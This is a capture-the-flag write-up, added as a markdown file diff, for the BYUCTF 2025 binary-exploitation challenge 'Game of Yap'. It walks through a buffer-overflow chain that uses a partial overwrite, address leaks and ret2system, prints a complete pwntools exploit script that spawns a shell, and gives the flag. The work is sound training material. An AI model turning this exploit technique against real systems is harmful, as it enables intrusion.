@@ -1,0 +1,151 @@
+---
+title: "Game of Yap — BYUCTF 2025"
+date: 2026-06-27
+author: "Imattas aka Zemi"
+slug: "byuctf-2025-game-of-yap"
+order: 269
+writeupKind: "challenge"
+ctfSlug: "byuctf-2025"
+ctfTitle: "BYUCTF 2025"
+---
+
+# Game of Yap — BYUCTF 2025
+
+> **Category:** `Binary Exploitation`  
+> **Author:** Imattas aka Zemi  
+> **Flag:** `byuctf{heres_your_yap_plus_certification_c13abe01}`  
+> **Source Path:** `pwn/game-of-yap`
+
+---
+
+## Challenge Description
+
+```text
+yap yap yap
+
+`nc yap.chal.cyberjousting.com 1355`
+
+[game-of-yap.zip]
+```
+
+---
+
+## Provided Materials
+
+- [Repository folder](https://github.com/BYU-CSA/BYUCTF-2025/tree/main/pwn/game-of-yap)
+- [pwn/game-of-yap/README.md](https://github.com/BYU-CSA/BYUCTF-2025/blob/main/pwn/game-of-yap/README.md)
+- [pwn/game-of-yap/game-of-yap.zip](https://github.com/BYU-CSA/BYUCTF-2025/blob/main/pwn/game-of-yap/game-of-yap.zip)
+- [pwn/game-of-yap/solve.py](https://github.com/BYU-CSA/BYUCTF-2025/blob/main/pwn/game-of-yap/solve.py)
+
+---
+
+## Recon / Initial Analysis
+
+This page imports the BYUCTF 2025 source material for the Binary Exploitation challenge **Game of Yap**. The prompt is kept separate from the solve notes, and upstream artifacts are linked so the challenge can be replayed from the original repository.
+
+---
+
+## Vulnerability / Observation
+
+The useful observation comes from the imported solve notes below. I kept the original technical path intact while normalizing the page metadata, challenge grouping, and author attribution for the Volume 2 writeup archive.
+
+---
+
+## Exploitation / Solution
+
+Source: [pwn/game-of-yap/README.md](https://github.com/BYU-CSA/BYUCTF-2025/blob/main/pwn/game-of-yap/README.md)
+
+This challenge gives you two chances to perform a buffer overflow in the `play` function. However, PIE is enabled (no other protections besides NX). For the first BOF, you need to perform a partial overwrite to jump to the `yap` function, which will leak a binary address for you. For the second BOF, you'll use that leak to write a small ROP chain. You can write a ROP chain to jump to the provided `mov rdi, rsi` gadget, which will conveniently move the pointer to the buffer (which you control) into `rdi`, and then call `printf`. You can leverage this to leak a libc address from the stack. The ROP chain will finally return back into `play` in order to provide one last chance to exploit the binary. In this final BOF, you can use the libc leak to ret2system.
+
+See [solve.py](https://github.com/BYU-CSA/BYUCTF-2025/blob/main/pwn/game-of-yap/solve.py) for a PoC.
+
+**Flag** - `byuctf{heres_your_yap_plus_certification_c13abe01}`
+
+---
+
+## Full Exploit Script
+
+Source: [pwn/game-of-yap/solve.py](https://github.com/BYU-CSA/BYUCTF-2025/blob/main/pwn/game-of-yap/solve.py)
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+
+binary = "./game-of-yap"
+remote_addr = "yap.chal.cyberjousting.com"
+remote_port = 1355
+
+elf = context.binary = ELF(binary, checksec=False)
+libc = ELF("./libc.so.6", checksec=False)
+
+gs = """
+break *(play+42)
+break *(yap+40)
+continue
+"""
+
+def run():
+    if args.REMOTE:
+        return remote(remote_addr, remote_port)
+    elif args.GDB:
+        context.terminal = ["tmux", "splitw", "-h", "-l", "120"]
+        try:
+            return gdb.debug(binary, gdbscript=gs)
+        except ValueError:
+            print("ERROR: tmux not active")
+        exit(1)
+    else:
+        return elf.process()
+
+p = run()
+
+##### Pwn #####
+mov_rdi_rsi = 0x1243
+
+# First exploit
+p.recvuntil(b"Here's your first chance...\n")
+payload = flat(
+    b'A'*264,
+    ((elf.sym['yap'] + 8) & 0xff).to_bytes()
+)
+p.send(payload)
+
+leak = p.recvline()
+elf.address = int(leak, 16) - elf.sym['play']
+print('ELF base:', hex(elf.address))
+
+# Second exploit
+p.recvuntil(b'One more try...\n')
+payload = flat(
+    '%27$p'.ljust(264, 'A').encode(),
+    p64(elf.address + mov_rdi_rsi),
+    p64(elf.plt['printf']),
+    p64(elf.sym['play']+4)
+)
+p.send(payload)
+
+leak = p.recvuntil(b'AAA', drop=True)
+libc.address = int(leak, 16) - 0x228b - 0x28000
+print('libc system:', hex(libc.sym['system']))
+
+# Final exploit
+rop = ROP(libc)
+payload = flat(
+    b'A'*264,
+    p64(rop.rdi.address),
+    p64(next(libc.search(b'/bin/sh'))),
+    p64(libc.sym['system'])
+)
+p.send(payload)
+p.recv()
+
+p.interactive()
+```
+
+---
+
+## Key Takeaways
+
+- The BYUCTF 2025 challenge material is preserved with local archive formatting.
+- The page author is normalized to Imattas aka Zemi.
+- The source repository remains linked for handouts, services, and solve artifacts.
